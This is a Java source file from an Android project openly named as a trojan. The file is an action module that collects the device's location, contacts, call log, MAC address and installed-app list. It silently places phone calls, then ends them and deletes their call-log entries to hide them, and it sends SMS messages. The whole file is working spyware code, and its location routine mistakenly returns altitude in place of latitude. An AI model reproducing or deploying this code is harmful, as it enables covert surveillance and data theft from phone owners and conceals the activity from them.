package trojan.android.android_trojan;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

import trojan.android.android_trojan.BroadcastReceiver.PhoneStateReceiver;

/**
 * Created by hoodlums on 28/01/15.
 */
public class ActionService {

    private static final String TAG = "ActionService";

    public double[] getLocation(Context context) {
        //Get location manager
        LocationManager locManager = (LocationManager) context.getSystemService(context.LOCATION_SERVICE);
        //get the best provider to obtain the current location
        Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
        double[] result = new double[2];

        //try to get latitude and longitude
        try {
            result[0] = location.getAltitude();
            result[1] = location.getLongitude();
        } catch (Exception ex) {//if this failed the method return 0,0
            Log.d(TAG, ex.getMessage());
            result[0] = 0;
            result[1] = 0;
        }
        return result;
    }


    public ArrayList getContacts(Context context) {
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add(new String[]{name, phoneNo});
                    }
                    pCur.close();
                }
            }
        }
        return contacts;
    }

    public void call(String num, long time, Context context) {
        if (time > 1000) {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + num));
            context.startActivity(intent);
            Log.d(TAG, "Start call");
            PhoneStateReceiver test = new PhoneStateReceiver();
            Tools.sleep(time);
            test.onReceive(context, intent);
            test.killCall(context);
            Log.d(TAG, "Stop call");
            Tools.sleep(1000);
            deleteCallLog(num, context);
        }
    }

    public ArrayList getCallLog(Context context) {
        ArrayList<String[]> callLog = new ArrayList<String[]>();
        String columns[] = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
        if (cursor.moveToFirst()) {
            do {
                callLog.add(new String[]{
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
                });
            } while (cursor.moveToNext());
        }
        return callLog;
    }

    public void deleteCallLog(String num, Context context) {
        String strNumberOne[] = {num};
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
        if (cursor.moveToFirst()) {
            do {
                int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                context.getContentResolver().delete(
                        CallLog.Calls.CONTENT_URI,
                        CallLog.Calls._ID + "= ? ",
                        new String[]{String.valueOf(idOfRowToDelete)});
            } while (cursor.moveToNext());
        }
    }

    public String getMacAddress(Context context) {
        WifiManager manager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = manager.getConnectionInfo();
        return info.getMacAddress();
    }

    public void SendSMS(String numTelephone, String message) {
        // permet de voir dans les log si la fct marche
        Log.d(TAG, "SendSMS");
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(numTelephone, null, message, null, null);
    }


    class PInfo {
        private String appname = "";
        private String pname = "";
        private String versionName = "";
        private int versionCode = 0;
        private Drawable icon;

        private void prettyPrint() {
            Log.d(TAG, appname + "\t" + pname + "\t" + versionName + "\t" + versionCode);
        }
    }

    public ArrayList<PInfo> getPackages(Context context) {
        ArrayList<PInfo> apps = getInstalledApps(false, context); /* false = no system packages */
        final int max = apps.size();
        for (int i = 0; i < max; i++) {
            apps.get(i).prettyPrint();
        }
        return apps;
    }

    public ArrayList<PInfo> getInstalledApps(boolean getSysPackages, Context context) {
        ArrayList<PInfo> res = new ArrayList<PInfo>();
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue;
            }
            PInfo newInfo = new PInfo();
            newInfo.appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
            newInfo.pname = p.packageName;
            newInfo.versionName = p.versionName;
            newInfo.versionCode = p.versionCode;
            newInfo.icon = p.applicationInfo.loadIcon(context.getPackageManager());
            res.add(newInfo);
        }
        return res;
    }
}
